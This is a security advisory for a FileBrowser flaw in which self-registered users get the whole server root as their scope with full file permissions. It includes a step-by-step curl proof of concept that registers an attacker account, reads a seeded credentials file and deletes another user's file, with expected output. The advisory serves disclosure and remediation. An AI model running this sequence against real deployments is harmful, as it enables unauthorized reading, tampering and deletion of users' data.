# GHSA-6759-996p-gpj6 / CVE-2026-72839 — Self-signup users inherit the server root as their scope

- Severity: critical (CVSS 9.8)
- CWEs: CWE-266, CWE-1188
- Affected: github.com/filebrowser/filebrowser/v2 <= 2.63.16
- Published: 2026-07-25T05:22:20Z
- URL: https://github.com/filebrowser/filebrowser/security/advisories/GHSA-6759-996p-gpj6

---

## Summary

When self-registration is enabled (`Signup=true`) and the factory-default `CreateUserDir=false` is left unchanged, the `signupHandler` endpoint (`POST /api/signup`) creates every new account with `Scope="/"`, the entire FileBrowser server root, together with the default Create/Modify/Delete/Rename/Share/Download permissions.

Any unauthenticated user can register an account and immediately read, modify, and delete every file FileBrowser manages, including other users' private files and any host paths mounted into the served directory. The previous signup hardening (CVE-2026-32760 / CVE-2026-34528 / CVE-2026-35607) only stripped the inherited `Admin`, `Execute`, and `Commands` privileges; it never reset `Scope` or the remaining destructive permissions, so the escalation primitive is still fully present in v2.63.15.

## Details

**1. The handler applies all defaults, then clears only Admin/Execute/Commands (`http/auth.go:176`)**

```go
d.settings.Defaults.Apply(user)   // copies default Scope (".") and the full Perm set

user.Perm.Admin = false           // line 180, cleared
user.Perm.Execute = false         // line 185, cleared
user.Commands = []string{}        // line 186, cleared
// Create, Modify, Delete, Rename, Share, Download are NOT cleared
```

`Defaults.Apply` copies the entire `Permissions` struct and the default `Scope`. Only three privileges are stripped afterwards; the six CRUD permissions survive.

**2. Scope is only reset when `CreateUserDir` is enabled (`http/auth.go:194-203`)**

```go
if d.settings.CreateUserDir {
    user.Scope = ""               // only reached when CreateUserDir=true
}
userHome, err := d.settings.MakeUserDir(user.Username, user.Scope, d.server.Root)
// ...
user.Scope = userHome
```

`CreateUserDir` is `false` by factory default, so this branch is skipped and `user.Scope` keeps the default value `"."` set by `Apply`.

**3. `MakeUserDir` normalizes `"."` to `"/"` (`settings/dir.go:33`)**

```go
userScope = path.Join("/", userScope)   // path.Join("/", ".") == "/"
```

The normalized scope `"/"` is written back as `user.Scope`, so the account is persisted with access to the whole server root.

**4. Net effect**

With only `Signup` flipped on and everything else at factory defaults, an unauthenticated registrant receives the server root (`/`) plus six CRUD permissions. `Signup` is the single deliberate change an administrator makes when they choose to offer self-registration; no other non-default configuration is required.

## PoC

Tested against `filebrowser/filebrowser:v2.63.15` with sample files `/srv/sensitive/db_creds.txt`, `/srv/user1/private/creds.txt`, and `/srv/user2/finance.csv`.

**Attack Vector: read and delete the server root as an unauthenticated registrant:**

```bash
#1. Seed sample data in /tmp and start a fresh v2.63.15 container
mkdir -p /tmp/filebrowser-test/srv/{user1/private,user2,sensitive}
echo "ROOT_DB_PASSWORD=supersecret" > /tmp/filebrowser-test/srv/sensitive/db_creds.txt
echo "SECRET_PASSWORD=hunter2"      > /tmp/filebrowser-test/srv/user1/private/creds.txt
echo "financial data"              > /tmp/filebrowser-test/srv/user2/finance.csv
docker run -d --name filebrowser-test -p 8090:80 -v /tmp/filebrowser-test/srv:/srv filebrowser/filebrowser:v2.63.15 && sleep 4
B=http://localhost:8090

#2. Admin logs in and enables self-registration (signup=true), the ONLY non-default change; all else factory default
AP=$(docker logs filebrowser-test 2>&1 | grep -o 'password: .*' | awk '{print $2}')
AT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' -d "{\"username\":\"admin\",\"password\":\"$AP\"}")
curl -s -H "X-Auth: $AT" $B/api/settings \
  | python3 -c "import sys,json;d=json.load(sys.stdin);d['signup']=True;print(json.dumps(d))" \
  | curl -s -X PUT $B/api/settings -H "X-Auth: $AT" -H 'Content-Type: application/json' -d @-

#3. Attacker self-registers with no authentication
curl -s -X POST $B/api/signup -H 'Content-Type: application/json' -d '{"username":"attacker","password":"AttackerPass123!"}'

#4. Attacker logs in and captures the JWT
XT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' -d '{"username":"attacker","password":"AttackerPass123!"}')

#5. Attacker lists the entire server root (sees sensitive, user1, user2)
curl -s "$B/api/resources/"                  -H "X-Auth: $XT"

#6. Attacker reads another scope's secret
curl -s "$B/api/raw/sensitive/db_creds.txt"  -H "X-Auth: $XT"

#7. Attacker deletes another user's file (prints HTTP 204)
curl -s -X DELETE "$B/api/resources/user2/finance.csv" -H "X-Auth: $XT" -o /dev/null -w '%{http_code}\n'
```

Expected output (reproduced on a fresh `filebrowser-test` container, v2.63.15):

```http
GET /api/resources/                       -> 200
{"path":"/","items":[{"name":"sensitive",...},{"name":"user1",...},{"name":"user2",...}]}

GET /api/raw/sensitive/db_creds.txt       -> 200
ROOT_DB_PASSWORD=supersecret

DELETE /api/resources/user2/finance.csv   -> 204   (empty body, file deleted)

GET /api/users   (as admin, confirms how the registrant was stored)  -> 200
{"username":"attacker","scope":"/","perm":{"create":true,"rename":true,"modify":true,"delete":true,"share":true,"download":true}}
```

## Impact

- **Unauthenticated full read:** any registrant can download or share every file, including other users' private data, configuration, secrets, and any host paths mounted into the served volume.
- **Unauthenticated full write:** the registrant can create, overwrite, or rename any file, defacement, planting malicious content (e.g. a web shell where the served tree overlaps a web root), or silent data tampering.
- **Unauthenticated deletion:** the registrant can delete any file, causing data loss or denial of service for all users.
- **Multi-tenant breakout:** in any shared deployment, a single self-registered account reads and destroys every other user's files.
- **No special permissions required:** the attack needs only that an admin enabled `Signup`; the registrant inherits the dangerous scope and permissions automatically.

## Resolution

As this is mostly a configuration footgun, a startup warning has been added when signup is enabled without `createUserDir` and the default scope resolves to root. In addition, the documentation has been updated to include the best practices regarding signup: https://filebrowser.org/deployment.html#self-registration-signup.
